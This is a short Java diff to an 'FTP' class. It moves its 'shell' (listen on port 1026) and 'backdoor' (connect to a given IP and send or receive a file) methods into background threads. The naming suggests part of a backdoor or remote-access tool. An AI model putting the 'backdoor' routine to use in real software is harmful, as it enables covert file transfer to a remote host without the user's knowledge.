@@ -13,6 +13,8 @@ import java.nio.Buffer;
 
 public class FTP {
 
+	public static boolean socketTransferDone = false;
+
 	/**
 	 * Transfers a file with client.
 	 * <p>
@@ -25,18 +27,26 @@ public class FTP {
 	 *
 	 * @param filePath path of file to transfer
 	 * @param protocol if file should be sent or received
-	 * @throws IOException
 	 */
-	public static void shell(String filePath, String protocol) throws IOException {
-		ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
-		serverSocketChannel.socket().bind(new InetSocketAddress(1026));
-		SocketChannel socketChannel = serverSocketChannel.accept();
-		if (protocol.equals("send"))
-			send(filePath, socketChannel);
-		else if (protocol.equals("rec"))
-			rec(filePath, socketChannel);
-		serverSocketChannel.close();
-		socketChannel.close();
+	public static void shell(String filePath, String protocol) {
+		Thread thread = new Thread() {
+			public void run() {
+				try {
+					ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
+					serverSocketChannel.socket().bind(new InetSocketAddress(1026));
+					SocketChannel socketChannel = serverSocketChannel.accept();
+					if (protocol.equals("send"))
+						send(filePath, socketChannel);
+					else if (protocol.equals("rec"))
+						rec(filePath, socketChannel);
+					serverSocketChannel.close();
+					socketChannel.close();
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			}
+		};
+		thread.start();
 	}
 
 	/**
@@ -51,17 +61,27 @@ public class FTP {
 	 * @param filePath path of file to transfer
 	 * @param protocol if file should be sent or received
 	 * @param ip       IP address of server to transfer file with
-	 * @throws IOException
 	 */
-	public static void backdoor(String filePath, String protocol, String ip) throws IOException {
-		SocketChannel socketChannel = SocketChannel.open();
-		SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
-		socketChannel.connect(socketAddress);
-		if (protocol.equals("send"))
-			send(filePath, socketChannel);
-		else if (protocol.equals("rec"))
-			rec(filePath, socketChannel);
-		socketChannel.close();
+	public static void backdoor(String filePath, String protocol, String ip) {
+		Thread thread = new Thread() {
+			public void run() {
+				try {
+					Thread.sleep(2000);
+					SocketChannel socketChannel = SocketChannel.open();
+					SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
+					socketChannel.connect(socketAddress);
+					if (protocol.equals("send"))
+						send(filePath, socketChannel);
+					else if (protocol.equals("rec"))
+						rec(filePath, socketChannel);
+					socketChannel.close();
+					socketTransferDone = true;
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			}
+		};
+		thread.start();
 	}
 
 	/**
